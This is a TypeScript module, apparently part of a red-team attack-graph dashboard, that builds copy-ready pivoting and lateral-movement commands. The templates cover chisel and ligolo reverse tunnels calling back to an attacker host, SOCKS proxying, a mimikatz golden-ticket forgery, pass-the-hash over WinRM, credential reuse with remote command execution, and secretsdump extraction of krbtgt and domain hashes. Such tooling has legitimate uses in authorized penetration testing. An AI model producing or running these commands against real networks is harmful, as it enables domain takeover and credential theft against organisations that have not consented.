import { AttackGraphEdge, AttackEdgeType, PivotCommandSet, ATTACK_EDGE_META } from '../types';
import { safeCopyToClipboard, playCyberSound } from './helpers';

export interface PivotCommandOptions {
  user?: string;
  domain?: string;
  hash?: string;
  password?: string;
}

/**
 * Real-time pivot & lateral movement command generator.
 * Synchronizes with active HUD variables (lhost, lport) and edge topologies.
 */
export function generatePivotCommands(
  edge: AttackGraphEdge,
  sourceIp: string,
  targetIp: string,
  lhost: string,
  lport: string,
  options?: PivotCommandOptions
): PivotCommandSet {
  const activeLhost = (lhost && lhost.trim()) ? lhost.trim() : '10.10.14.X';
  const activePort = edge.port ? String(edge.port) : ((lport && lport.trim()) ? lport.trim() : '1080');
  const srcIp = (sourceIp && sourceIp.trim()) ? sourceIp.trim() : (edge.sourceId || '10.10.10.X');
  const tgtIp = (targetIp && targetIp.trim()) ? targetIp.trim() : (edge.targetId || '10.10.10.Y');

  const user = options?.user || 'Administrator';
  const domain = options?.domain || 'corp.local';
  const hash = options?.hash || 'HASH';
  const password = options?.password || 'Password123!';

  switch (edge.type) {
    case 'pivot-ssh': {
      const sshUser = options?.user || 'root';
      const listener = `ssh -N -D ${activePort} ${sshUser}@${srcIp}`;
      const client = `# (SSH Dynamic SOCKS proxy terminates on local client; forwards traffic through ${srcIp})`;
      const proxychains = `socks5 127.0.0.1 ${activePort}`;
      const verify = `proxychains4 curl -s -I http://${tgtIp}`;
      return {
        listenerCommand: listener,
        clientCommand: client,
        proxychainsSnippet: proxychains,
        verificationCommand: verify,
        quickCopyText: listener,
      };
    }

    case 'pivot-chisel': {
      const listener = `chisel server -p 8000 --reverse`;
      const client = `chisel client ${activeLhost}:8000 R:${activePort}:socks`;
      const proxychains = `socks5 127.0.0.1 ${activePort}`;
      const verify = `proxychains4 curl -s -I http://${tgtIp}`;
      return {
        listenerCommand: listener,
        clientCommand: client,
        proxychainsSnippet: proxychains,
        verificationCommand: verify,
        quickCopyText: listener,
      };
    }

    case 'pivot-ligolo': {
      const listener = `ligolo-proxy -selfcert`;
      const client = `agent.exe -connect ${activeLhost}:11601 -ignore-cert`;
      const proxychains = `# Ligolo-ng Layer 3 TUN Setup:\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\nsudo ip route add ${tgtIp}/32 dev ligolo`;
      const verify = `ping -c 2 ${tgtIp}`;
      return {
        listenerCommand: listener,
        clientCommand: client,
        proxychainsSnippet: proxychains,
        verificationCommand: verify,
        quickCopyText: listener,
      };
    }

    case 'pivot-socks5': {
      const listener = `# SOCKS5 Dynamic Proxy listening on port ${activePort}`;
      const client = `# Route traffic through SOCKS5 proxy towards target ${tgtIp}`;
      const proxychains = `socks5 127.0.0.1 ${activePort}`;
      const verify = `proxychains4 nmap -sT -Pn -p 22,80,445 ${tgtIp}`;
      return {
        listenerCommand: listener,
        clientCommand: client,
        proxychainsSnippet: proxychains,
        verificationCommand: verify,
        quickCopyText: proxychains,
      };
    }

    case 'ad-trust-bidirectional': {
      const listener = `nltest /domain_trusts /all_trusts`;
      const client = `bloodhound-python -u '${user}' -p '${password}' -d '${domain.toUpperCase()}' -dc ${srcIp} -c All`;
      const proxychains = `# Route through pivot if across subnets:\nsocks5 127.0.0.1 ${activePort}`;
      const verify = `nltest /dsgetdc:${domain.toUpperCase()} /server:${tgtIp}`;
      return {
        listenerCommand: listener,
        clientCommand: client,
        proxychainsSnippet: proxychains,
        verificationCommand: verify,
        quickCopyText: listener,
      };
    }

    case 'ad-trust-parent-child': {
      const listener = `mimikatz # kerberos::golden /user:Administrator /domain:child.${domain} /sid:S-1-5-21-CHILD /sids:S-1-5-21-ROOT-519 /krbtgt:HASH /ticket:golden.kirbi`;
      const client = `mimikatz # kerberos::ptt golden.kirbi`;
      const proxychains = `socks5 127.0.0.1 ${activePort}`;
      const verify = `dir \\\\${tgtIp}\\c$`;
      return {
        listenerCommand: listener,
        clientCommand: client,
        proxychainsSnippet: proxychains,
        verificationCommand: verify,
        quickCopyText: listener,
      };
    }

    case 'lateral-cred-reuse': {
      const listener = `netexec smb ${tgtIp} -u '${user}' -p '${password}'`;
      const client = `netexec smb ${tgtIp} -u '${user}' -p '${password}' --shares`;
      const proxychains = `socks5 127.0.0.1 ${activePort}`;
      const verify = `netexec smb ${tgtIp} -u '${user}' -p '${password}' --exec-method smbexec -x 'whoami'`;
      return {
        listenerCommand: listener,
        clientCommand: client,
        proxychainsSnippet: proxychains,
        verificationCommand: verify,
        quickCopyText: listener,
      };
    }

    case 'lateral-pth-winrm': {
      const cmd = `evil-winrm -i ${tgtIp} -u ${user} -H ${hash}`;
      const listener = cmd;
      const client = cmd;
      const proxychains = `socks5 127.0.0.1 ${activePort}`;
      const verify = cmd;
      return {
        listenerCommand: listener,
        clientCommand: client,
        proxychainsSnippet: proxychains,
        verificationCommand: verify,
        quickCopyText: cmd,
      };
    }

    case 'domain-admin-path': {
      const listener = `secretsdump.py '${domain}/${user}:${password}'@${tgtIp} -just-dc-user krbtgt`;
      const client = `bloodhound-python -u '${user}' -p '${password}' -d '${domain.toUpperCase()}' -dc ${tgtIp} -c All`;
      const proxychains = `socks5 127.0.0.1 ${activePort}`;
      const verify = `secretsdump.py '${domain}/${user}:${password}'@${tgtIp} -just-dc`;
      return {
        listenerCommand: listener,
        clientCommand: client,
        proxychainsSnippet: proxychains,
        verificationCommand: verify,
        quickCopyText: listener,
      };
    }

    default: {
      const listener = `# Custom Pivot / Lateral Movement: ${edge.type}`;
      const client = `# Target: ${tgtIp}`;
      const proxychains = `socks5 127.0.0.1 ${activePort}`;
      const verify = `ping -c 2 ${tgtIp}`;
      return {
        listenerCommand: listener,
        clientCommand: client,
        proxychainsSnippet: proxychains,
        verificationCommand: verify,
        quickCopyText: verify,
      };
    }
  }
}

/**
 * 1-click copy with audio confirmation feedback.
 * Calls safeCopyToClipboard(text) and playCyberSound('copy').
 */
export async function copyPivotCommandWithFeedback(
  text: string,
  soundEnabled: boolean = true
): Promise<boolean> {
  const success = await safeCopyToClipboard(text);
  if (success && soundEnabled) {
    try {
      playCyberSound('copy');
    } catch {
      // Audio playback fails safely if blocked or in headless environment
    }
  }
  return success;
}

/**
 * Returns human-readable label for an attack edge type.
 */
export function getPivotTypeLabel(type: AttackEdgeType): string {
  return ATTACK_EDGE_META[type]?.label || type;
}

/**
 * Returns description for an attack edge type.
 */
export function getPivotTypeDescription(type: AttackEdgeType): string {
  return ATTACK_EDGE_META[type]?.description || '';
}

/**
 * Returns theme color for an attack edge type.
 */
export function getPivotTypeColor(type: AttackEdgeType): string {
  return ATTACK_EDGE_META[type]?.color || '#38BDF8';
}

/**
 * Formats a clean proxychains4.conf configuration snippet.
 */
export function formatProxychainsConf(port: string | number = '1080'): string {
  return `[ProxyList]\nsocks5 127.0.0.1 ${port}`;
}

/**
 * Check if the given edge is a network tunnel.
 */
export function isTunnelEdge(type: AttackEdgeType): boolean {
  return ATTACK_EDGE_META[type]?.category === 'tunnel';
}

/**
 * Check if the given edge is an Active Directory trust.
 */
export function isAdTrustEdge(type: AttackEdgeType): boolean {
  return ATTACK_EDGE_META[type]?.category === 'ad-trust';
}

/**
 * Check if the given edge is lateral movement / DA path.
 */
export function isLateralEdge(type: AttackEdgeType): boolean {
  return ATTACK_EDGE_META[type]?.category === 'lateral';
}
